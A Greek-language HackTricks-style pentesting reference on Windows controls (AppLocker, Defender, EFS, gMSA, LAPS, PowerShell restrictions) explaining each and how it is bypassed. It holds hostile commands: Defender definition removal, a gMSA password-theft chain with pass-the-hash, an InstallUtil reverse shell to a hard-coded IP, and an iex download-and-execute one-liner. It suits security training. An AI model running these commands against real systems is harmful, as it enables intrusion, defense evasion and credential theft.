# Έλεγχοι Ασφάλειας Windows

{{#include ../../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια λίστα επιτρεπόμενων εφαρμογών (application whitelist) είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατεύσει το περιβάλλον από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρησιακές ανάγκες ενός οργανισμού.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση εφαρμογής λευκής λίστας** της Microsoft και δίνει στους διαχειριστές συστήματος έλεγχο πάνω στο **ποιες εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** σε εκτελέσιμα αρχεία, scripts, Windows installer files, DLLs, packaged apps και packed app installers.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν cmd.exe και PowerShell.exe** και την εγγραφή (write access) σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις είναι στη μαύρη/λευκή λίστα:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζονται από το AppLocker, παρέχοντας έναν τρόπο να ελέγξετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμα **Writable folders** για να bypass την AppLocker Policy: Αν το AppLocker επιτρέπει την εκτέλεση οτιδήποτε μέσα σε `C:\Windows\System32` ή `C:\Windows` υπάρχουν **writable folders** που μπορείτε να χρησιμοποιήσετε για να **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Συνήθως **εμπιστευόμενα** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries μπορούν επίσης να είναι χρήσιμα για να παρακάμψουν το AppLocker.
- Οι **ελλιπώς γραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν**
- Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε ένα **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
- Οι οργανισμοί συχνά επικεντρώνονται στο **μπλοκάρισμα του `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, αλλά ξεχνούν τις **άλλες** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή `PowerShell_ISE.exe`.
- Το **DLL enforcement σπάνια ενεργοποιείται** λόγω του πρόσθετου φορτίου που μπορεί να επιφέρει σε ένα σύστημα και του όγκου δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Επομένως η χρήση **DLLs ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε Powershell** κώδικα σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Αποθήκευση διαπιστευτηρίων

### Διαχειριστής λογαριασμών ασφάλειας (Security Accounts Manager, SAM)

Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο, οι κωδικοί είναι κατακερματισμένοι.

### Τοπική Αρχή Ασφαλείας (Local Security Authority, LSA) - LSASS

Τα **διαπιστευτήρια** (κατακερματισμένα) **αποθηκεύονται** στη **μνήμη** αυτού του υποσυστήματος για λόγους Single Sign-On.\  
**LSA** διαχειρίζεται την τοπική **πολιτική ασφάλειας** (password policy, δικαιώματα χρηστών...), **authentication**, **access tokens**...\  
Η LSA θα είναι αυτή που θα **ελέγξει** για τα παρεχόμενα διαπιστευτήρια μέσα στο αρχείο **SAM** (για τοπική σύνδεση) και θα **επικοινωνήσει** με τον **domain controller** για να πιστοποιήσει έναν domain χρήστη.

Τα **διαπιστευτήρια** **αποθηκεύονται** μέσα στη **διεργασία LSASS**: Kerberos tickets, NT και LM hashes, εύκολα αποκρυπτογραφούμενοι κωδικοί πρόσβασης.

### LSA secrets

Η LSA μπορεί να αποθηκεύσει στον δίσκο κάποια διαπιστευτήρια:

- Κωδικός του λογαριασμού του υπολογιστή στο Active Directory (απρόσιτος domain controller).
- Κωδικοί πρόσβασης των λογαριασμών των Windows services
- Κωδικοί πρόσβασης για προγραμματισμένες εργασίες
- Περισσότερα (π.χ. κωδικός εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Παρουσιάζεται μόνο σε Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, και σε εκδόσεις του Windows Server. Αυτό **μπλοκάρει** κοινά pentesting εργαλεία όπως **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender** μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να μάθετε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για περαιτέρω διερεύνηση μπορείτε επίσης να εκτελέσετε:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Κρυπτογραφημένο Σύστημα Αρχείων (EFS)

Η EFS προστατεύει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **File Encryption Key (FEK)**. Το κλειδί αυτό κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται στο $EFS **alternative data stream** του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη χρησιμοποιείται για να αποκρυπτογραφήσει το FEK από το $EFS stream. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς πρωτοβουλία του χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε σύστημα αρχείων που δεν υποστηρίζει EFS, όπως [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκαθίστανται αυτόματα.
- Κρυπτογραφημένα αρχεία που αποστέλλονται μέσω δικτύου με το πρωτόκολλο SMB/CIFS αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης επιτρέπει **διαφανή πρόσβαση** στα κρυπτογραφημένα αρχεία για τον ιδιοκτήτη. Ωστόσο, η απλή αλλαγή του κωδικού του ιδιοκτήτη και το log in δεν επιτρέπουν αυτόματα την αποκρυπτογράφηση.

Κύρια σημεία:

- Η EFS χρησιμοποιεί ένα συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση γίνεται με το ιδιωτικό κλειδί του χρήστη για την πρόσβαση στο FEK.
- Αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως αντιγραφή σε FAT32 ή μετάδοση μέσω δικτύου.
- Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα από τον ιδιοκτήτη χωρίς επιπλέον βήματα.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτή την **υπηρεσία** ελέγχοντας αν υπάρχει η διαδρομή:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας cipher /c \<file\>  
Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **encrypt** και **decrypt** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Έχοντας δικαιώματα SYSTEM

Αυτή η μέθοδος απαιτεί ο **θύμα-χρήστης** να **τρέχει** μια **διαδικασία** στο host. Αν αυτό συμβαίνει, χρησιμοποιώντας μια session `meterpreter` μπορείτε να μιμηθείτε το token της διεργασίας του χρήστη (`impersonate_token` από `incognito`). Ή μπορείτε απλά να `migrate` στη διεργασία του χρήστη.

#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των service accounts σε υποδομές IT. Σε αντίθεση με τους παραδοσιακούς service accounts που συχνά έχουν το ρυθμιστικό "**Password never expire**" ενεργό, τα gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:

- **Automatic Password Management**: Τα gMSA χρησιμοποιούν έναν πολύπλοκο, 240-χαρακτήρων κωδικό που αλλάζει αυτόματα σύμφωνα με την πολιτική domain ή computer. Αυτή η διαδικασία διαχειρίζεται από την Key Distribution Service (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικών.
- **Enhanced Security**: Αυτοί οι λογαριασμοί είναι ανοσοποιημένοι σε lockouts και δεν μπορούν να χρησιμοποιηθούν για interactive logins, αυξάνοντας την ασφάλειά τους.
- **Multiple Host Support**: Τα gMSA μπορούν να μοιράζονται σε πολλαπλά hosts, καθιστώντας τα ιδανικά για υπηρεσίες που τρέχουν σε πολλαπλούς servers.
- **Scheduled Task Capability**: Σε αντίθεση με managed service accounts, τα gMSA υποστηρίζουν την εκτέλεση scheduled tasks.
- **Simplified SPN Management**: Το σύστημα ενημερώνει αυτόματα το Service Principal Name (SPN) όταν υπάρχουν αλλαγές στα sAMaccount στοιχεία ή το DNS name του υπολογιστή, απλοποιώντας τη διαχείριση των SPN.

Οι κωδικοί των gMSA αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναφέρονται αυτόματα κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτός ο κωδικός, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους servers στους οποίους είναι εγκατεστημένα τα gMSA, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες απαιτείται ασφαλής σύνδεση όπως LDAPS, ή η σύνδεση πρέπει να έχει authentication με 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Μπορείτε να διαβάσετε αυτόν τον κωδικό με [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Βρες περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)

Επίσης, δες αυτή την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) για το πώς να εκτελέσεις μια **NTLM relay attack** για να **read** το **password** του **gMSA**.

### Κατάχρηση αλυσίδας ACL για να read το gMSA managed password (GenericAll -> ReadGMSAPassword)

Σε πολλά περιβάλλοντα, χρήστες με χαμηλά προνόμια μπορούν να αποκτήσουν πρόσβαση σε μυστικά gMSA χωρίς να διακυβευτεί ο DC, εκμεταλλευόμενοι λανθασμένα ρυθμισμένα ACL αντικειμένων:

- Μια ομάδα που ελέγχεις (π.χ. μέσω GenericAll/GenericWrite) έχει εκχωρημένο το `ReadGMSAPassword` σε ένα gMSA.
- Προσθέτοντας τον εαυτό σου σε αυτή την ομάδα κληρονομείς το δικαίωμα να διαβάσεις το `msDS-ManagedPassword` blob του gMSA μέσω LDAP και να εξάγεις usable NTLM credentials.

Τυπική ροή εργασίας:

1) Ανακάλυψε τη διαδρομή με BloodHound και σήμανε τους foothold principals ως Owned. Ψάξε για edges όπως:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Πρόσθεσε τον εαυτό σου στην ενδιάμεση ομάδα που ελέγχεις (παράδειγμα με bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Ανάγνωση του gMSA managed password μέσω LDAP και παραγωγή του NTLM hash. Το NetExec αυτοματοποιεί την εξαγωγή του `msDS-ManagedPassword` και τη μετατροπή σε NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Πιστοποιηθείτε ως το gMSA χρησιμοποιώντας το NTLM hash (δεν απαιτείται plaintext). Αν ο λογαριασμός είναι στο Remote Management Users, το WinRM θα λειτουργήσει απευθείας:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Σημειώσεις:
- LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
- Τα gMSAs συχνά λαμβάνουν τοπικά δικαιώματα όπως WinRM· επαληθεύστε τη συμμετοχή σε ομάδες (π.χ., Remote Management Users) για να σχεδιάσετε lateral movement.
- Εάν χρειάζεστε μόνο το blob για να υπολογίσετε το NTLM εσείς οι ίδιοι, δείτε τη δομή MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

Η **Local Administrator Password Solution (LAPS)**, διαθέσιμη για λήψη από τη [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των τοπικών κωδικών του Administrator. Αυτοί οι κωδικοί, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα, παρέχεται η δυνατότητα ανάγνωσης των τοπικών admin passwords.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που χρειάζονται για την αποτελεσματική χρήση του PowerShell, όπως το μπλοκάρισμα COM objects, την επιτρεπόμενη χρήση μόνο εγκεκριμένων τύπων .NET, XAML-based workflows, PowerShell classes, και άλλα.

### **Έλεγχος**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Παράκαμψη
```bash
#Easy bypass
Powershell -version 2
```
Σε τρέχοντα Windows αυτό το Bypass δεν θα λειτουργήσει αλλά μπορείτε να χρησιμοποιήσετε [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε ίσως χρειαστεί** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> προσθέστε `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **αλλάξτε το project σε .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **execute Powershell** code σε οποιαδήποτε διεργασία και να παρακάμψετε το constrained mode. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Κύριοι τρόποι για να παρακάμψετε αυτήν την πολιτική:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την πιστοποίηση χρηστών.

Το SSPI είναι υπεύθυνο για την εύρεση του κατάλληλου πρωτοκόλλου για δύο μηχανήματα που θέλουν να επικοινωνήσουν. Η προτιμώμενη μέθοδος για αυτό είναι Kerberos. Στη συνέχεια το SSPI θα διαπραγματευτεί ποιο πρωτόκολλο πιστοποίησης θα χρησιμοποιηθεί — αυτά τα πρωτόκολλα πιστοποίησης ονομάζονται Security Support Provider (SSP), βρίσκονται σε κάθε μηχάνημα Windows με τη μορφή DLL και και οι δύο μηχανές πρέπει να υποστηρίζουν το ίδιο για να μπορούν να επικοινωνήσουν.

### Κύρια SSPs

- **Kerberos**: Το προτιμώμενο
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: για λόγους συμβατότητας
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers και LDAP, ο κωδικός σε μορφή MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL και TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί ποιο πρωτόκολλο θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos ως προεπιλογή)
- %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλαπλές μεθόδους ή μόνο μία.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που ενεργοποιεί μια **προτροπή συγκατάθεσης για ενέργειες με αυξημένα προνόμια**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Αναφορές

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
